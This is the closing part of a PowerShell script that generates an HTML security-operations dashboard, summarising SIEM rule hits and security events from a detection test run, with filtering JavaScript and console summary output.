.detail-block p{font-size:11.5px;color:var(--txt);line-height:1.55}
.detail-block code{font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace;font-size:10px;background:var(--bg3);padding:2px 6px;border-radius:4px;border:1px solid var(--border);color:var(--cyan)}
.detail-block .rec{background:rgba(34,221,136,.06);border:1px solid rgba(34,221,136,.15);border-radius:6px;padding:8px 10px;color:var(--green);font-size:11px}

/* ── Event rows ── */
.sev-r-crit td{border-left:3px solid rgba(255,69,96,.6)}
.sev-r-high td{border-left:3px solid rgba(255,176,32,.5)}
.sev-r-med td{border-left:3px solid rgba(59,158,255,.4)}

/* ── Badges ── */
.sev{display:inline-block;padding:1px 7px;border-radius:4px;font-size:9px;font-weight:700;letter-spacing:.5px;border:1px solid transparent}
.sev.crit{background:var(--red-dim);color:var(--red);border-color:rgba(255,69,96,.25)}
.sev.high{background:var(--orange-dim);color:var(--orange);border-color:rgba(255,176,32,.25)}
.sev.med{background:var(--blue-dim);color:var(--blue);border-color:rgba(59,158,255,.2)}
.sev.info{background:rgba(80,96,112,.1);color:var(--txt2);border-color:rgba(80,96,112,.15)}
.badge-fired{display:inline-flex;align-items:center;gap:5px;padding:2px 9px;border-radius:20px;font-size:9px;font-weight:700;background:var(--red-dim);color:var(--red);border:1px solid rgba(255,69,96,.3)}
.badge-clean{display:inline-flex;align-items:center;gap:5px;padding:2px 9px;border-radius:20px;font-size:9px;font-weight:700;background:var(--green-dim);color:var(--green);border:1px solid rgba(34,221,136,.2)}
.badge-skip{display:inline-flex;align-items:center;gap:5px;padding:2px 9px;border-radius:20px;font-size:9px;font-weight:700;background:rgba(80,96,112,.08);color:var(--txt3);border:1px solid rgba(80,96,112,.15)}
.badge-dot{width:5px;height:5px;border-radius:50%;background:currentColor;display:inline-block}
.badge-fired .badge-dot{animation:glow 1.5s infinite}
.eid-tag{display:inline-block;padding:2px 7px;border-radius:5px;background:var(--blue-dim);color:var(--blue);font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace;font-size:10px;font-weight:600;border:1px solid rgba(59,158,255,.2)}
.lb{display:inline-block;padding:1px 5px;border-radius:4px;font-size:8.5px;font-weight:700;letter-spacing:.4px}
.lb-sec{background:rgba(255,69,96,.12);color:#ff7090} .lb-sys{background:rgba(255,176,32,.1);color:var(--orange)} .lb-smon{background:rgba(160,112,255,.12);color:var(--purple)} .lb-ps{background:rgba(34,221,136,.1);color:var(--green)} .lb-ts{background:rgba(0,212,255,.1);color:var(--cyan)} .lb-oth{background:rgba(80,96,112,.1);color:var(--txt2)}
.mitre{background:var(--purple-dim);color:var(--purple);padding:2px 6px;border-radius:4px;font-size:9.5px;font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace;border:1px solid rgba(160,112,255,.2)}
.count-badge{background:var(--blue-dim);color:var(--blue);padding:2px 8px;border-radius:20px;font-size:10px;font-weight:700;border:1px solid rgba(59,158,255,.2)}

/* ── Utility ── */
.mono{font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace}
.sm{font-size:11px}
.muted{color:var(--txt2)}
.td-time{font-size:10.5px;white-space:nowrap}
.td-rule{font-weight:700;color:var(--blue);font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace;font-size:11px}
.td-name{font-weight:500;max-width:280px}
.td-cat{color:var(--txt2);font-size:11px}
.td-eids{font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace;font-size:10px;color:var(--txt3)}
.td-user{max-width:120px}
.td-desc{max-width:200px}
.td-detail{max-width:240px}
.no-events{text-align:center;padding:48px 20px;color:var(--txt2)}
.no-events .ico{font-size:36px;display:block;margin-bottom:12px;opacity:.4}
.no-events p{font-size:12px}

/* ── Progress bar ── */
.pbar-wrap{height:3px;background:rgba(30,45,61,.5);border-radius:2px;overflow:hidden;min-width:80px}
.pbar{height:100%;border-radius:2px;transition:width .6s ease}
.pbar.crit{background:var(--red)} .pbar.high{background:var(--orange)} .pbar.med{background:var(--blue)} .pbar.info{background:var(--txt3)}

/* ── Test info bar ── */
.test-info{background:linear-gradient(135deg,rgba(59,158,255,.08),rgba(0,212,255,.05));border:1px solid rgba(59,158,255,.2);border-radius:8px;padding:10px 16px;margin-bottom:16px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.test-info .ti-item{display:flex;align-items:center;gap:6px;font-size:11px}
.test-info .ti-key{color:var(--txt3);font-weight:600;text-transform:uppercase;font-size:9px;letter-spacing:.7px}
.test-info .ti-val{color:var(--cyan);font-family:'Consolas','Cascadia Code','JetBrains Mono',monospace;font-size:11px;font-weight:600}

/* ── Footer ── */
.footer{border-top:1px solid var(--border);padding:16px 24px;text-align:center;font-size:10px;color:var(--txt3);margin-top:32px}
.footer strong{color:var(--blue)}

/* ── Input ── */
input[type=text]{background:var(--bg3);border:1px solid var(--border);color:var(--txt);border-radius:6px;outline:none;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,sans-serif}
input[type=text]:focus{border-color:var(--blue)}
</style>
</head>
<body>

<!-- NAVBAR -->
<nav class="nav">
  <a class="nav-brand" href="#">
    <span class="dot"></span>
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
    NEXUS&nbsp;<span style="opacity:.5;font-weight:400">SOC</span>
  </a>
  <div class="nav-sep"></div>
  <div class="nav-meta">
    <span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>$env:COMPUTERNAME</span>
    <span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg><span id="live-clock">$ReportTime</span></span>
    <span class="nav-badge $(if ($sysmonOK) {'ok'} else {'warn'})">$(if ($sysmonOK) {'SYSMON ON'} else {'SYSMON OFF'})</span>
    <span class="nav-badge $(if ($adOK) {'ok'} else {'warn'})">$(if ($adOK) {'AD ON'} else {'AD OFF'})</span>
  </div>
  <div class="nav-right">
    <div class="tw-group" id="tw-group">
      <button class="tw-btn $(if ($DefaultWindow -eq '30m') {'active'})" onclick="setTimeWindow(30,this)">30m</button>
      <button class="tw-btn $(if ($DefaultWindow -eq '1h') {'active'})" onclick="setTimeWindow(60,this)">1h</button>
      <button class="tw-btn $(if ($DefaultWindow -eq '2h') {'active'})" onclick="setTimeWindow(120,this)">2h</button>
      <button class="tw-btn $(if ($DefaultWindow -eq '24h') {'active'})" onclick="setTimeWindow(1440,this)">24h</button>
    </div>
    <button class="fb-btn" onclick="window.print()">
      <svg width="12" height="12" style="vertical-align:middle;margin-right:4px" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9V2h12v7M6 18H4a2 2 0 01-2-2v-5a2 2 0 012-2h16a2 2 0 012 2v5a2 2 0 01-2 2h-2M6 14h12v8H6z"/></svg>
      Export
    </button>
  </div>
</nav>

<!-- MAIN -->
<div class="wrap">

  <!-- Test info bar -->
  <div class="test-info">
    <div class="ti-item"><span class="ti-key">Test ID</span><span class="ti-val">$RND</span></div>
    <div class="ti-item"><span class="ti-key">Test User</span><span class="ti-val">$TestUser</span></div>
    <div class="ti-item"><span class="ti-key">Ransom Note</span><span class="ti-val">README_DECRYPT_$RND.txt</span></div>
    <div class="ti-item"><span class="ti-key">Script Start</span><span class="ti-val">$($ScriptStart.ToString('HH:mm:ss'))</span></div>
    <div class="ti-item"><span class="ti-key">Generated</span><span class="ti-val">$ReportTime</span></div>
    <div class="ti-item"><span class="ti-key">Filter</span><span class="ti-val" style="color:var(--green)">SOC-TAGGED ONLY</span></div>
  </div>

  <!-- KPI row -->
  <div class="kpi-row">
    <div class="kpi k-blue"><div class="kpi-label">SOC Events</div><div class="kpi-val" id="kpi-soc">$TotalSOC</div><div class="kpi-sub">of $TotalAll total events</div></div>
    <div class="kpi k-red"><div class="kpi-label">Rules Fired</div><div class="kpi-val" id="kpi-fired">$FiredCount</div><div class="kpi-sub">of $TotalRules evaluated</div></div>
    <div class="kpi k-red"><div class="kpi-label">Critical</div><div class="kpi-val" id="kpi-crit">$CritSOC</div><div class="kpi-sub">$CritFired critical rules fired</div></div>
    <div class="kpi k-orange"><div class="kpi-label">High</div><div class="kpi-val" id="kpi-high">$HighSOC</div><div class="kpi-sub">$HighFired high rules fired</div></div>
    <div class="kpi k-cyan"><div class="kpi-label">Medium</div><div class="kpi-val" id="kpi-med">$MedSOC</div><div class="kpi-sub">test event coverage</div></div>
    <div class="kpi k-green"><div class="kpi-label">Rules Clean</div><div class="kpi-val" id="kpi-clean">$NotFiredCount</div><div class="kpi-sub">$SkippedCount skipped (N/A)</div></div>
  </div>

  <!-- Charts -->
  <div class="charts-row">
    <div class="chart-panel">
      <div class="chart-title"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/><path d="M9 12l2 2 4-4"/></svg> Rules Status</div>
      <div class="chart-wrap"><canvas id="rulesChart"></canvas></div>
      <div class="donut-center"><div class="big">$FiredPct%</div><div class="sub">rules fired</div></div>
    </div>
    <div class="chart-panel">
      <div class="chart-title"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22,12 18,12 15,21 9,3 6,12 2,12"/></svg> SOC Event Timeline</div>
      <div class="chart-wrap" id="tl-chart-wrap"><canvas id="tlChart"></canvas></div>
    </div>
    <div class="chart-panel">
      <div class="chart-title"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg> Severity Split</div>
      <div class="chart-wrap"><canvas id="sevChart"></canvas></div>
      <div class="donut-center"><div class="big">$CritSOC</div><div class="sub">critical events</div></div>
    </div>
  </div>

  <!-- SIEM Rules Panel -->
  <div class="panel">
    <div class="panel-hdr">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--red)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
      <span class="panel-title">SIEM Correlation Rules <span class="count-badge" style="margin-left:6px">$TotalRules Rules</span></span>
      <span class="badge-fired" style="font-size:10px">$FiredCount FIRED</span>
      <span class="badge-clean" style="font-size:10px">$NotFiredCount CLEAN</span>
      <div class="panel-actions">
        <div class="search-wrap">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
          <input type="text" id="ruleSearch" class="fb-search" placeholder="Search rules, MITRE, category..." style="width:220px;padding:5px 10px 5px 28px">
        </div>
        <button class="fb-btn" onclick="filterRuleStatus('FIRED',this)" id="btn-fired-only">Fired Only</button>
        <button class="fb-btn active" onclick="filterRuleStatus('ALL',this)" id="btn-all-rules">All Rules</button>
        <span class="counter" id="rule-vis-count">$TotalRules rules</span>
      </div>
    </div>
    <div class="filter-bar">
      <span class="fb-label">Severity:</span>
      <button class="fb-btn active" onclick="filterRuleSev('ALL',this)">All</button>
      <button class="fb-btn a-crit" onclick="filterRuleSev('CRITICAL',this)" style="color:var(--red)">CRITICAL</button>
      <button class="fb-btn a-high" onclick="filterRuleSev('HIGH',this)" style="color:var(--orange)">HIGH</button>
      <button class="fb-btn" onclick="filterRuleSev('MEDIUM',this)" style="color:var(--blue)">MEDIUM</button>
      <div class="fb-sep"></div>
      <span class="fb-label" style="margin-left:4px">Category:</span>
      <button class="fb-btn" onclick="filterRuleCat('Authentication',this)">Auth</button>
      <button class="fb-btn" onclick="filterRuleCat('Lateral Movement',this)">Lateral</button>
      <button class="fb-btn" onclick="filterRuleCat('Persistence',this)">Persistence</button>
      <button class="fb-btn" onclick="filterRuleCat('Credential Access',this)">Credentials</button>
      <button class="fb-btn" onclick="filterRuleCat('Defense Evasion',this)">Evasion</button>
      <button class="fb-btn" onclick="filterRuleCat('Impact',this)">Impact</button>
      <span class="fb-sep"></span>
      <span class="muted sm" style="font-size:10px">Click row for details</span>
    </div>
    <div class="tbl-scroll">
      <table class="tbl" id="ruleTable">
        <thead>
          <tr>
            <th onclick="sortTbl('ruleTable',0)">Rule ID &#x25C4;</th>
            <th>Severity</th>
            <th onclick="sortTbl('ruleTable',2)">Rule Name &#x25C4;</th>
            <th>Category</th>
            <th>MITRE</th>
            <th>EIDs Checked</th>
            <th onclick="sortTbl('ruleTable',6)">Status &#x25C4;</th>
          </tr>
        </thead>
        <tbody id="ruleBody">$SIEMRowsHTML</tbody>
      </table>
    </div>
  </div>

  <!-- Events Panel -->
  <div class="panel">
    <div class="panel-hdr">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--blue)" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/><polyline points="14,2 14,8 20,8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
      <span class="panel-title">Security Event Log <span class="count-badge" style="margin-left:6px" id="evt-count-badge">$TotalSOC SOC events</span></span>
      <span style="font-size:10px;color:var(--green);font-weight:600">&#x2713; Filtered: soc_* artifacts only</span>
      <div class="panel-actions">
        <div class="search-wrap">
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
          <input type="text" id="evtSearch" class="fb-search" placeholder="Search user, IP, process, EID..." style="width:240px;padding:5px 10px 5px 28px">
        </div>
        <span class="counter" id="evt-vis-count">$TotalSOC events</span>
      </div>
    </div>
    <div class="filter-bar">
      <span class="fb-label">Severity:</span>
      <button class="fb-btn active" onclick="filterEvt('sev','ALL',this)">All</button>
      <button class="fb-btn a-crit" onclick="filterEvt('sev','CRITICAL',this)" style="color:var(--red)">CRITICAL <span class="count-badge" style="font-size:9px;margin-left:2px">$CritSOC</span></button>
      <button class="fb-btn a-high" onclick="filterEvt('sev','HIGH',this)" style="color:var(--orange)">HIGH <span class="count-badge" style="font-size:9px;margin-left:2px">$HighSOC</span></button>
      <button class="fb-btn" onclick="filterEvt('sev','MEDIUM',this)" style="color:var(--blue)">MED <span class="count-badge" style="font-size:9px;margin-left:2px">$MedSOC</span></button>
      <div class="fb-sep"></div>
      <span class="fb-label">Log:</span>
      <button class="fb-btn" onclick="filterEvt('log','Security',this)"><span class="lb lb-sec">SEC</span></button>
      <button class="fb-btn" onclick="filterEvt('log','System',this)"><span class="lb lb-sys">SYS</span></button>
      $(if ($sysmonOK) { '<button class="fb-btn" onclick="filterEvt(''log'',''Sysmon'',this)"><span class="lb lb-smon">SMON</span></button>' })
      <button class="fb-btn" onclick="filterEvt('log','PowerShell',this)"><span class="lb lb-ps">PS</span></button>
    </div>
    $(if ($TotalSOC -eq 0) {
      "<div class='no-events'><span class='ico'>&#x1F50D;</span><p>No SOC-tagged events found in last <strong>$DashboardHours</strong> hour(s).<br>Run the trigger script first, then reload this report.</p></div>"
    } else {
      "<div class='tbl-scroll'><table class='tbl' id='evtTable'><thead><tr><th style='width:36px'>#</th><th onclick='sortTbl(""evtTable"",1)'>Time &#x25C4;</th><th>Log</th><th onclick='sortTbl(""evtTable"",3)'>EID &#x25C4;</th><th onclick='sortTbl(""evtTable"",4)'>Sev &#x25C4;</th><th>Category</th><th>Description</th><th>User</th><th>Source IP</th><th>Detail</th></tr></thead><tbody id='evtBody'>$EventRowsHTML</tbody></table></div>"
    })
  </div>

</div><!-- /.wrap -->

<div class="footer">
  <strong>NEXUS SOC Intelligence Platform</strong> &nbsp;&bull;&nbsp; Production Edition &nbsp;&bull;&nbsp;
  $env:COMPUTERNAME ($env:USERDOMAIN) &nbsp;&bull;&nbsp; Test ID: $RND &nbsp;&bull;&nbsp;
  $TotalSOC SOC events &nbsp;&bull;&nbsp; $FiredCount/$TotalRules rules fired &nbsp;&bull;&nbsp;
  Window: Last $DashboardHours hour(s) &nbsp;&bull;&nbsp; Generated: $ReportTime
</div>

<script>
'use strict';
const ALL_EVENT_EPOCHS = [$AllEpochsJS];

// FIX-V24-01: REPORT_NOW_MS is the UTC epoch ms at report generation time.
// All time-window logic (timeline buckets, event row cutoff) uses this as "now",
// NOT Date.now(). The live clock still ticks with Date.now(), but filtering is
// anchored to when the report was generated so the dashboard always shows the
// same data regardless of when the HTML file is opened.
const REPORT_NOW_MS = $ReportTimeEpochMS;

// ── Live clock ──────────────────────────────────────────────────────────────
function tickClock() {
  const el = document.getElementById('live-clock');
  if (el) el.textContent = new Date().toLocaleString('en-GB',{hour12:false}).replace(',','');
}
setInterval(tickClock, 1000);

// ── SIEM Rule data ───────────────────────────────────────────────────────────
$SIEMRuleJS

// ── Time window filter ───────────────────────────────────────────────────────
let activeWindowMins = $( switch ($DefaultWindow) { "30m" {30} "1h" {60} "2h" {120} "24h" {1440} default {60} } );
let tlChartObj = null;
function setTimeWindow(mins, btn) {
  activeWindowMins = mins;
  document.querySelectorAll('.tw-btn').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  applyEvtFilters();
  rebuildTimeline(mins);
}
function rebuildTimeline(mins) {
  // FIX-V26-01: NXChart inline — always available. Null only if canvas element missing.
  if (!tlChartObj) return;
  const now = REPORT_NOW_MS; // FIX-V24-01: anchored to report generation time
  const buckets = Math.min(mins, 120);
  const msPerBucket = (mins * 60000) / buckets;
  const labels = [], data = new Array(buckets).fill(0);
  for (let i = buckets - 1; i >= 0; i--) {
    const t = new Date(now - i * msPerBucket);
    labels.push(t.getHours().toString().padStart(2,'0')+':'+t.getMinutes().toString().padStart(2,'0'));
  }
  ALL_EVENT_EPOCHS.forEach(ep => {
    const age = now - ep;
    if (age >= 0 && age < mins * 60000) {
      const idx = buckets - 1 - Math.floor(age / msPerBucket);
      if (idx >= 0 && idx < buckets) data[idx]++;
    }
  });
  tlChartObj.data.labels = labels;
  tlChartObj.data.datasets[0].data = data;
  tlChartObj.update('none');
}

// ── Charts ───────────────────────────────────────────────────────────────────
// FIX-V26-01: Chart.js CDN removed. NXChart is inline above — always available.
// Rules donut
const rulesCtx = document.getElementById('rulesChart');
if (rulesCtx) {
  NXChart(rulesCtx, {
    type:'doughnut',
    data:{ labels:['FIRED','CLEAN','SKIPPED'], datasets:[{ data:[$FiredCount,$NotFiredCount,$SkippedCount], backgroundColor:['rgba(255,69,96,.7)','rgba(34,221,136,.6)','rgba(80,96,112,.4)'] }] },
    options:{ cutout:'70' }
  });
}

// Timeline
const tlCtx = document.getElementById('tlChart');
if (tlCtx) {
  tlChartObj = NXChart(tlCtx, {
    type:'line',
    data:{ labels:[$TLLabelsJS], datasets:[{ data:[$TLDataJS], borderColor:'#3b9eff', backgroundColor:'rgba(59,158,255,.06)' }] },
    options:{}
  });
}

// Severity donut
const sevCtx = document.getElementById('sevChart');
if (sevCtx) {
  NXChart(sevCtx, {
    type:'doughnut',
    data:{ labels:['CRITICAL','HIGH','MEDIUM'], datasets:[{ data:[$CritSOC,$HighSOC,$MedSOC], backgroundColor:['rgba(255,69,96,.7)','rgba(255,176,32,.65)','rgba(59,158,255,.6)'] }] },
    options:{ cutout:'68' }
  });
}

// ── SIEM rule row expand ─────────────────────────────────────────────────────
function openRuleDetail(ruleId) {
  const r = SIEM_RULES[ruleId];
  if (!r) return '';
  const statusColor = r.status === 'FIRED' ? 'var(--red)' : r.status === 'SKIPPED' ? 'var(--txt3)' : 'var(--green)';
  return '<td class="detail-cell" colspan="7"><div class="detail-inner">' +
    '<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px">' +
    '<span class="eid-tag" style="font-size:11px;padding:3px 10px">' + ruleId + '</span>' +
    '<strong style="color:#e0ecf8">' + r.name + '</strong>' +
    '<code class="mitre">' + r.mitre + '</code>' +
    '<span style="color:' + statusColor + ';font-size:11px;font-weight:700">' + r.status + (r.count > 0 ? ' — ' + r.count + ' events' : '') + '</span>' +
    '</div>' +
    '<div class="detail-grid">' +
    '<div class="detail-block"><label>Detection Logic</label><p>' + r.detectionLogic + '</p></div>' +
    '<div class="detail-block"><label>Recommendation</label><div class="rec">' + r.recommendation + '</div></div>' +
    '<div class="detail-block"><label>EIDs / Sources</label><p><code>' + r.eids + '</code></p><label style="margin-top:8px">Category</label><p>' + r.category + '</p></div>' +
    '</div></div></td>';
}

let openRule = null;
document.getElementById('ruleBody').addEventListener('click', function(e) {
  const row = e.target.closest('tr.siem-row');
  if (!row) return;
  const ruleId = row.dataset.rule;
  // Remove existing detail row
  const existing = document.getElementById('detail-' + (openRule||''));
  if (existing) { existing.remove(); }
  if (openRule === ruleId) { openRule = null; return; }
  openRule = ruleId;
  const detRow = document.createElement('tr');
  detRow.id = 'detail-' + ruleId;
  detRow.className = 'detail-row';
  detRow.innerHTML = openRuleDetail(ruleId);
  row.after(detRow);
  setTimeout(() => detRow.style.display = 'table-row', 10);
});

// ── Rule filtering ───────────────────────────────────────────────────────────
let ruleStatusF = 'ALL', ruleSevF = 'ALL', ruleCatF = 'ALL';

function filterRuleStatus(s, btn) {
  ruleStatusF = s;
  document.querySelectorAll('#ruleTable .fb-btn, .panel-actions .fb-btn').forEach(b => b.classList.remove('active'));
  if (btn) btn.classList.add('active');
  applyRuleFilters();
}
function filterRuleSev(s, btn) {
  ruleSevF = s;
  // FIX-V23-04: Was clearing ALL .filter-bar .fb-btn page-wide, incorrectly resetting the
  // Event panel severity buttons whenever a Rule severity button was clicked.
  // Fix: scope removal to only the clicked button's own parent .filter-bar.
  if (btn) { btn.closest('.filter-bar').querySelectorAll('.fb-btn').forEach(b => b.classList.remove('active')); }
  if (btn) btn.classList.add('active');
  applyRuleFilters();
}
function filterRuleCat(c, btn) {
  ruleCatF = (ruleCatF === c) ? 'ALL' : c;
  // FIX-V23-04 (cont): Same scoping fix as filterRuleSev above.
  if (btn) { btn.closest('.filter-bar').querySelectorAll('.fb-btn').forEach(b => b.classList.remove('active')); }
  if (ruleCatF !== 'ALL' && btn) btn.classList.add('active');
  applyRuleFilters();
}
document.getElementById('ruleSearch').addEventListener('input', applyRuleFilters);

function applyRuleFilters() {
  const q = (document.getElementById('ruleSearch').value || '').toLowerCase();
  const rows = document.querySelectorAll('#ruleBody tr.siem-row');
  let vis = 0;
  rows.forEach(r => {
    const s = r.dataset.status || '', sv = r.dataset.sev || '', cat = r.dataset.cat || '';
    const ok = (ruleStatusF === 'ALL' || s === ruleStatusF) &&
               (ruleSevF    === 'ALL' || sv === ruleSevF) &&
               (ruleCatF    === 'ALL' || cat === ruleCatF) &&
               (!q || r.textContent.toLowerCase().includes(q));
    r.style.display = ok ? '' : 'none';
    if (ok) vis++;
  });
  document.getElementById('rule-vis-count').textContent = vis + ' of ' + rows.length + ' rules';
}

// ── Event filtering ──────────────────────────────────────────────────────────
let evtSevF = 'ALL', evtLogF = 'ALL';

function filterEvt(type, val, btn) {
  if (type === 'sev') evtSevF = val;
  else evtLogF = val;
  // FIX-V24-02: sev and log buttons share one .filter-bar in the Event panel.
  // v23 fix scoped removal to the whole filter-bar, which still wiped the other group.
  // Fix: only remove 'active' from buttons whose onclick contains the same type token.
  if (btn) {
    btn.closest('.filter-bar').querySelectorAll('.fb-btn').forEach(b => {
      if ((b.getAttribute('onclick') || '').includes("'" + type + "'")) b.classList.remove('active');
    });
    btn.classList.add('active');
  }
  applyEvtFilters();
}
document.getElementById('evtSearch').addEventListener('input', applyEvtFilters);

function applyEvtFilters() {
  const q    = (document.getElementById('evtSearch').value || '').toLowerCase();
  const rows = document.querySelectorAll('#evtBody tr.evt-row');
  const cutoff = new Date(REPORT_NOW_MS - activeWindowMins * 60 * 1000); // FIX-V24-01
  let vis = 0;
  rows.forEach(r => {
    const sev = r.dataset.sev || '', log = r.dataset.log || '';
    const ts  = new Date(parseInt(r.dataset.ts || '0'));
    const okSev = evtSevF === 'ALL' || sev === evtSevF;
    const okLog = evtLogF === 'ALL' || log === evtLogF;
    const okTime = ts >= cutoff;
    const okQ   = !q || r.textContent.toLowerCase().includes(q);
    const ok = okSev && okLog && okTime && okQ;
    r.style.display = ok ? '' : 'none';
    if (ok) vis++;
  });
  const vc = document.getElementById('evt-vis-count');
  if (vc) vc.textContent = vis + ' events';
  const badge = document.getElementById('evt-count-badge');
  if (badge) badge.textContent = vis + ' SOC events';
}

// ── Table sort ───────────────────────────────────────────────────────────────
const sortState = {};
function sortTbl(tableId, col) {
  const tbody = document.querySelector('#' + tableId + ' tbody');
  if (!tbody) return;
  const rows = Array.from(tbody.querySelectorAll('tr:not(.detail-row)'));
  const asc = !sortState[tableId + col]; sortState[tableId + col] = asc;
  const sevOrd = {CRITICAL:0,HIGH:1,MEDIUM:2,INFO:3};
  rows.sort((a,b) => {
    const at = a.cells[col]?.textContent.trim() || '';
    const bt = b.cells[col]?.textContent.trim() || '';
    if (col === 4 || col === 1) return asc ? (sevOrd[at]??9)-(sevOrd[bt]??9) : (sevOrd[bt]??9)-(sevOrd[at]??9);
    return asc ? at.localeCompare(bt) : bt.localeCompare(at);
  });
  rows.forEach(r => tbody.appendChild(r));
  if (tableId === 'evtTable') applyEvtFilters();
  else applyRuleFilters();
}

// ── Init ─────────────────────────────────────────────────────────────────────
(function init() {
  applyRuleFilters();
  applyEvtFilters();
  rebuildTimeline(activeWindowMins);
  // Auto-activate Fired Only if rules fired
  if ($FiredCount > 0) {
    // keep ALL by default for overview, user can filter
  }
})();
</script>
</body>
</html>
"@

# ── WRITE + OPEN ─────────────────────────────────────────────────────────────
Write-Host ""
Write-Host "  [*] Writing NEXUS dashboard..." -ForegroundColor DarkGray
$HTML | Out-File -FilePath $OutputPath -Encoding UTF8 -Force
$fileSize = [math]::Round((Get-Item $OutputPath).Length / 1KB, 1)
Write-Host ("  [+] Dashboard: {0}  ({1} KB)" -f $OutputPath, $fileSize) -ForegroundColor Green

if (-not $NoBrowser) {
    Write-Host "  [*] Opening in browser..." -ForegroundColor DarkGray
    Start-Process $OutputPath
}

Write-Host ""
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host "  NEXUS DASHBOARD SUMMARY" -ForegroundColor Cyan
Write-Host "  ================================================================" -ForegroundColor Cyan
Write-Host ("  SOC Events (filtered) : {0}"  -f $TotalSOC)     -ForegroundColor White
Write-Host ("  Total Events (raw)    : {0}"  -f $TotalAll)     -ForegroundColor DarkGray
Write-Host ("  Critical              : {0}"  -f $CritSOC)      -ForegroundColor Red
Write-Host ("  High                  : {0}"  -f $HighSOC)      -ForegroundColor Yellow
Write-Host ("  Medium                : {0}"  -f $MedSOC)       -ForegroundColor Cyan
Write-Host ""
Write-Host ("  SIEM Rules : {0}/{1} FIRED | {2} NOT FIRED | {3} SKIPPED" -f $FiredCount,$TotalRules,$NotFiredCount,$SkippedCount) -ForegroundColor $(if ($FiredCount -gt 0) {"Red"} else {"Green"})
Write-Host ""
Write-Host "  TOP FIRED RULES:" -ForegroundColor White
foreach ($rule in ($SIEMResults | Where-Object {$_.Status -eq "FIRED"} | Sort-Object EventCount -Descending | Select-Object -First 8)) {
    Write-Host ("    {0,-12} {1,-48} [{2} events]" -f $rule.RuleID,$rule.Name,$rule.EventCount) -ForegroundColor Red
}
Write-Host ""
Write-Host ("  Dashboard: {0}" -f $OutputPath) -ForegroundColor Green
Write-Host "  ================================================================" -ForegroundColor Cyan
